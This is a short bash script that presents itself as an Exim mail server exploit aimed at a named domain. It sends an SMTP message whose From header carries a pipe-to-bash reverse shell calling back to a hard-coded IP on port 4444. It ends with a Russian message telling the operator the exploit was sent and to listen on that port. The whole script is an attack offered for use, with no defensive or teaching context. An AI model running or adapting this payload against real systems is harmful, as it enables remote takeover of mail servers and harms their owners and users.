#!/bin/bash
echo "Exploiting Exim at evik-24.ru:587..."
(
  sleep 2; echo "HELO attacker.com"
  sleep 1; echo "MAIL FROM: <attacker@example.com>"
  sleep 1; echo "RCPT TO: <admin@evik-24.ru>"
  sleep 1; echo "DATA"
  sleep 1; echo "From: |/bin/bash -c 'bash -i >& /dev/tcp/5.228.81.229/4444 0>&1'"
  sleep 1; echo "Subject: RCE"
  sleep 1; echo "."
  sleep 1; echo "QUIT"
) | openssl s_client -connect evik-24.ru:587 -starttls smtp -quiet 2>/dev/null
echo "[+] Эксплойт отправлен. Слушайте порт 4444."
